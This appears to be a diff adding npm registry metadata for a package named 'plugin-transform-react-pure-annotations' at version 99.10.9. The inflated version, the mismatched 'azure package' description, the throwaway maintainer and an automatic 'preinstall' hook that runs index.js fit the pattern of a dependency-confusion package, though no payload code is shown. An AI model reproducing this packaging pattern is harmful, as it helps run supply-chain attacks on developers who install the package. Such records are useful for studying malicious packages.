@@ -1,0 +1,62 @@
+{
+    "_id": "plugin-transform-react-pure-annotations",
+    "name": "plugin-transform-react-pure-annotations",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "plugin-transform-react-pure-annotations",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "plugin-transform-react-pure-annotations@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-Xu9V8QOcESQv6xd2JgVqurVUNxPeEZGR6z4Uu8rmtQKi2TzHdKsG8GNX+bH1RKwxkMdjCP9YFPpU6yc823FDVw==",
+                "shasum": "a84ba17af4b271a5bbea0f43ef7b678e783ac526",
+                "tarball": "https://registry.npmjs.org/plugin-transform-react-pure-annotations/-/plugin-transform-react-pure-annotations-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5091,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO56OACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrScw/+NtIhV1CK9PgvDRLqJvysWXruxwtVo5QjAKxz1SH0pmP/M8nc\r\nZYzkauuaoP4LDfDlw4Q1u4wkj/PzjiGzvIXQwbtXwiycz+mflbNSqou1tCo6\r\ncCKCCGDlcux5FfSUMZPofNPdcUz4S2twqlAJq+1ZsVKa1nMVJhBWjn93MEj3\r\nxD0zRwoJGLJjktJ7lx3K2oHIRArULFEutael14gfvnqwkajKNgZsJLDXkJX0\r\nYsO5zE5il3Z+Q9M0AnQBrg5lJwYDxgSYQ3K3aVOuN/wIn4iBojz1yUEI4seU\r\nIb/nCx6iF8wl/a3wH4LBrDRmdZRM12k5K+oxmmiQgZtDSF/K0hU4STZ2TEMl\r\nz7S6cmFzMcR00nTSfGKdYsUZvd2YuRu/qtWrfQgHuPU11xvRCBWQ0zlL2QJc\r\nzFYpXsOXufmVvWf+VWXJhsgAJWnU7sihewJLkhKXBcgKI4bSvM/1ldfpf0s4\r\naTq29STgvndRoUa9Cy+ccMn5zPK0KngHJ7br7YombOmB3QkDQTNiSON25Omx\r\n9vXY1UujCbM6sW6RRaRneErMSSnDMfX2qNci2IXjuanSjsVTFwLTowAhzKgx\r\nwx4nPVZHheMvMxaPVjPZxdWm6H1v4ExVSEvzN/LHqvSQR4Kncv5YoL9XUW6v\r\nZBhEH5ntTSfPELkbbWeWb+snC67TTAZZetY=\r\n=MV2+\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "pg0iv8hn",
+                "email": "pg0iv8hn@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "pg0iv8hn",
+                    "email": "pg0iv8hn@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/plugin-transform-react-pure-annotations_99.10.9_1648074382592_0.5795538618353768"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T22:26:22.592Z",
+        "99.10.9": "2022-03-23T22:26:22.745Z",
+        "modified": "2022-03-23T22:26:22.843Z"
+    },
+    "maintainers": [
+        {
+            "name": "pg0iv8hn",
+            "email": "pg0iv8hn@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
